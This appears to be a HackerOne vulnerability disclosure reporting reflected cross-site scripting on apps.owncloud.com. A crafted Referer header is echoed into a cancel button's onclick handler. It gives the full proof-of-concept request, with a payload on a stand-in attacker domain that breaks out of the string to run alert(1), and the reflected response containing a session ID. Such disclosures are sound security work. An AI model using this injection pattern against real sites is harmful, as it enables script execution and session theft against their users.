# HackerOne Report: apps.owncloud.com: XSS via referrer
**Report ID:** 83374
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic

## Vulnerability Information & PoC
Look at next request:


Host: apps.owncloud.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://www.myevilsite.com/qwe';alert(1)+'


in response page referrer pasts into onclick event of a cancel button

onclick="location.href='http://www.myevilsite.com/qwe';alert(1)+'?PHPSESSID=icqgmh3h639vn6a75j6idmj935'" />





## Discussion & Remediation Timeline
